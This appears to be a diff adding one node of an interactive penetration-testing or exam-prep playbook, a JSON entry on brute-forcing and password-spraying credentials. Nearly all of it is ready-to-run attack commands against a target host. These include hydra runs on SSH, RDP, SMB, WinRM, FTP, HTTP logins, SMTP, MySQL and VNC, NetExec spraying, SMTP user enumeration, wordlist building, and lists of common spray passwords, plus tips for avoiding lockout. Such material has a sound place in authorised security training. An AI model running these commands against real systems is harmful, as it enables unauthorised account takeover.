@@ -1,0 +1,22 @@
+{
+  "id": "bruteforce",
+  "phase": "CREDS",
+  "title": "Brute Force / Password Spray",
+  "body": "Know the difference — brute force tries many passwords against one user, spray tries one password against many users. AD environments lock out after 3-5 attempts. Always spray, never brute, against AD. Build a targeted wordlist with CeWL before throwing rockyou.",
+  "cmd": "# ── BUILD TARGETED WORDLIST FIRST ────────────────────\ncewl http://$ip -d 3 -m 5 -w custom.txt\n# Combine with rockyou top 1000 for best coverage:\nhead -1000 /usr/share/wordlists/rockyou.txt >> custom.txt\n\n# ── SSH ───────────────────────────────────────────────\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\\n  ssh://$ip -t 4 -o hydra_ssh.txt\n# Single user\nhydra -l root -P /usr/share/wordlists/rockyou.txt \\\n  ssh://$ip -t 4\n\n# ── RDP (3389) ────────────────────────────────────────\n# -t 4 and -W 3 required — RDP hates parallel connections\nhydra -L users.txt -p 'KnownPassword' rdp://$ip -t 4 -W 3\nhydra -l administrator -P /usr/share/wordlists/rockyou.txt \\\n  rdp://$ip -t 4 -W 3\n# \"account not active for remote desktop\" = valid creds, no RDP perms\n# → try those creds on SMB/WinRM before giving up\n# medusa as fallback if hydra RDP module errors:\nmedusa -h $ip -u administrator -P rockyou.txt -M rdp -t 1\n\n# ── SMB (445) ─────────────────────────────────────────\nhydra -L users.txt -P rockyou.txt smb://$ip\n# CME spray — safer for AD (one password at a time)\nnxc smb $ip -u users.txt -p 'Password123' --continue-on-success\nnxc smb $ip -u users.txt -p passwords.txt --no-bruteforce --continue-on-success\n# --no-bruteforce = spray mode (user1:pass1, user2:pass2 — not all combos)\n\n# ── WinRM (5985) ──────────────────────────────────────\nhydra -L users.txt -P rockyou.txt winrm://$ip -t 4\nnxc winrm $ip -u users.txt -p 'Password123' --continue-on-success\n\n# ── FTP (21) ──────────────────────────────────────────\nhydra -L users.txt -P rockyou.txt ftp://$ip -t 4\nhydra -l anonymous -P rockyou.txt ftp://$ip -t 4\n\n# ── HTTP Basic Auth (browser popup) ───────────────────\nhydra -l admin -P rockyou.txt $ip http-get / -t 4 -V\n# embed in URL for Burp once cracked: http://admin:pass@$ip/\n\n# ── HTTP POST Form ────────────────────────────────────\nhydra -l admin -P rockyou.txt $ip \\\n  http-post-form \"/login:username=^USER^&password=^PASS^:Invalid\" -t 4 -V\n\n# ── SMTP (25) ─────────────────────────────────────────\nhydra -L users.txt -P rockyou.txt smtp://$ip -t 4\n# User enum via VRFY first:\nsmtp-user-enum -M VRFY -U users.txt -t $ip\n\n# ── MySQL (3306) ──────────────────────────────────────\nhydra -l root -P rockyou.txt mysql://$ip -t 4\nnxc mssql $ip -u sa -p rockyou.txt  # MSSQL\n\n# ── VNC (5900) ────────────────────────────────────────\nhydra -P rockyou.txt vnc://$ip -t 4\n# VNC has no username — password only\n\n# ── SPRAY WORDLIST — safe for AD ──────────────────────\n# One password per user, check lockout first\n# Common spray passwords:\n# Season+Year:  Spring2024!  Winter2025!\n# Company name: Company123!\n# Common:       Password1  Welcome1  P@ssw0rd\nnet accounts /domain   # check lockout threshold on Windows\nnxc smb $ip -u user -p 'Password1' 2>/dev/null | grep -v FAILURE",
+  "warn": "Check lockout policy BEFORE spraying AD — 'net accounts /domain' or crackmapexec. Getting accounts locked will burn your exam. RDP hydra module is experimental — use -t 4 -W 3 always. 'Account not active for remote desktop' means the password IS correct — spray those creds on SMB and WinRM immediately.",
+  "choices": [
+    {
+      "label": "Got credentials!",
+      "next": "creds_found"
+    },
+    {
+      "label": "No luck — check service versions",
+      "next": "version_ref"
+    },
+    {
+      "label": "AD environment — careful with lockout",
+      "next": "ad_spray"
+    }
+  ]
+}
